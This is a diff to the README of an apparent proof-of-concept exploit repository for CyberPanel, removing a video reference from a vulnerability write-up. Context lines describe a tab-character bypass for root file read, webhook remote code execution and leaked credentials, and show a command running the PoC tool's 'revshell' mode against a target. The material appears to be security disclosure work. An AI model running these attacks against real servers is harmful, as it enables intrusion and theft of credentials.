@@ -159,13 +159,6 @@ tab (`\t`)**. Tab bypass enables root file read on all 3 endpoints.
 
 All evidence captured 2026-05-18 against self-owned test server.
 
-### Video — Full Chain Demonstration
-
-[poc-demo.mov](poc-demo.mov) — Screen recording of the complete
-escalation chain from normal tenant login to admin access.
-
-### Screenshots
-
 ### 1. Webhook RCE — Command Execution
 
 ![Webhook RCE](screenshots/01-webhook-rce-id.png)
@@ -282,7 +275,6 @@ python3 cp_poc.py revshell https://target:8090 -d site.com -u user -p pass \
 cyberpanel/
 ├── README.md                  ← This file
 ├── cp_poc.py                  ← PoC tool (Python 3.8+, stdlib only)
-├── poc-demo.mov               ← Full chain video demonstration
 └── screenshots/
     ├── 01-webhook-rce-id.png
     ├── 02-env-leak-credentials.png
